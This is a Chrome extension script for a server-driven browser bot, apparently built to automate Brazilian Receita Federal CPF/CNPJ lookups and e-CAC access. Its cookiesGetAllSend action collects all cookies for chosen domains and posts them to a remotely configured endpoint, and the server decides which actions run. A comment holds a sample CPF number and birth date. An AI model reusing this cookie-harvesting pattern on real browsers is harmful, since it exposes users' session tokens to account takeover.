const state = {urls: [], tasks: [], queryParam: {}};
const actions = {
    send: async body => {
        body = {
            payload: body,
            urls: state.urls,
            gfk: state.gfk,
            token: state.token,
            job: state.job,
            inject: false
        };
        const url = state.endPoint + "/browser";
        const endPoint = await fetch(url, {method: 'POST', body: JSON.stringify(body)});
        endPoint.json().then(response => {
            if (response.action)
                actions[response.action.name](...response.action.args);
        });
    },
    fetchGetJson: async name => {
        // https://github.com/drupalista-br/drupalista-br.github.io/tree/json
        const url = "https://raw.githubusercontent.com/drupalista-br/drupalista-br.github.io/json/" + name + ".json";
        const response = await fetch(url);
        return response.json();
    },
    getTasks: (job, isBotInject) => {
        if (isBotInject)
            job = "inject/" + job;

        return actions.fetchGetJson(job);
    },
    cookiesEat: domains => {
        return Promise.all(promises.cookiesGetAll(domains)).then(jars => {
            let cookies = [];
            jars.forEach(jar => cookies = jar.result.concat(cookies));

            return Promise.all(promises.cookiesEat(cookies));
        });
    },
    cookiesEatReload: (domains, to) => {
        actions.cookiesEat(domains)
        .then(results => chrome.tabs.update(state.tabId, {"url": to}));
    },
    cookiesGetAllSend: domains => {
        Promise.all(promises.cookiesGetAll(domains)).then(jars => {
            let cookies = {};
            jars.forEach(jar => cookies[jar.domain] = jar.result);

            actions.send(cookies);
        });
    },
    redirect: to => {
        return chrome.tabs.update(state.tabId, {"url": to});
    }
};
const promises = {
    cookiesGetAll: domains => {
        const promises = [];
        domains.forEach(domain => {
            promises.push(chrome.cookies.getAll({ domain: domain }).then(cookies => {
                return {
                    method: "cookiesGetAll",
                    domain: domain,
                    result: cookies
                };
            }));
        });
        return promises;
    },
    cookiesEat: cookies => {
        const promises = [];
        cookies.forEach(cookie => {
            const url = cookie => {
                if (cookie.domain.charAt(0) === ".")
                    cookie.domain = cookie.domain.replace(".", "");

                return "https://" + cookie.domain + cookie.path;
            };
            promises.push(chrome.cookies.remove({url: url(cookie), name: cookie.name}).then(cookie => {
                // cookie contains only name, storeId and url.
                return {
                    method: "cookiesEat",
                    result: cookie
                };
            }));
        });
        return promises;
    }
};
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    const url = new URL(tab.url);
    const setStateQueryParam = () => {
        state.queryParam = {
            job: url.searchParams.get("botJob"),
            inject: url.searchParams.has("botInject"),
            gfk: url.searchParams.get("botGfk"),
            token: url.searchParams.get("botToken"),
            endPoint: url.searchParams.get("botEndPoint")
        };
    };
    const isBotInject = () => {
        if (!state.cookie) return;

        chrome.cookies.set({
            domain: url.hostname,
            name: "botInject",
            value: state.cookie,
            path: "/",
            url: url.protocol + "//" + url.hostname
        });
        return chrome.scripting.executeScript({target: {tabId: tabId}, files: ['inject.js']});
    };
    const starting = () => {
        const setState = (tasks, endPoints) => {
            const endPoint = () => state.queryParam.endPoint ?? "remote";
            const cookieValue = () => {
                const value = () => state.queryParam.job + "|" + state.queryParam.gfk + "|" + state.queryParam.token + "|" + endPoint();
                if (state.queryParam.inject)
                    return value();
            };
            state.urls.push(tab.url);
            state.gfk = state.queryParam.gfk;
            state.token = state.queryParam.token;
            state.job = state.queryParam.job;
            state.tasks = [...tasks];
            state.endPoint = endPoints[endPoint()];
            state.cookie = cookieValue();
        };
        if (state.queryParam.job) {
            if (!state.queryParam.token)
                throw new Error("botToken query parameter is missing.");

            actions.fetchGetJson("endPoints").then(endPoints => {
                actions.getTasks(state.queryParam.job, state.queryParam.inject).then(tasks => {
                    setState(tasks, endPoints);
                    state.tasks.shift();
                    if (isBotInject()) return;

                    actions[tasks[0].action.name](...tasks[0].action.args);
                });
            });
            return true;
        }
    };
    const onCourse = () => {
        if (state.tasks.length === 0) return;
        if (tab.url.includes(state.tasks[0].url)) {
            const name = state.tasks[0].action.name;
            const args = state.tasks[0].action.args;
            state.urls.push(tab.url);
            state.tasks.shift();

            if (isBotInject()) return;

            actions[name](...args);
        }
    };
    const tabStatus = () => {
        const neededStatus = url.searchParams.get("botTabStatus") ?? 'loading';
        if (changeInfo.status === neededStatus)
            return true;
    };
    if (!tabStatus()) return;

    state.tabId = tabId;
    setStateQueryParam();
    if (starting()) return;
    onCourse();
});

/*
== cpf ==
https://servicos.receita.fazenda.gov.br/servicos/cpf/consultasituacao/consultapublica.asp?cpf=81910851191&nascimento=25/08/1979&botJob=consulta_cpf&botInject&botToken=teste&botEndPoint=local

== cnpj e qsa ==
https://servicos.receita.fazenda.gov.br/Servicos/cnpjreva/Cnpjreva_Solicitacao.asp?cnpj=84432111000400&botJob=consulta_cnpj&botInject&botToken=teste22&botEndPoint=local
https://servicos.receita.fazenda.gov.br/Servicos/cnpjreva/Cnpjreva_Solicitacao.asp?cnpj=03835832000116&botJob=consulta_cnpj&botInject&botToken=teste22&botEndPoint=local


== Cookies Ecac ===

chrome://newtab/?botJob=ecac_acesso_gov_certificate&botGfk=testeGfk&botToken=teste2&botEndPoint=local
*/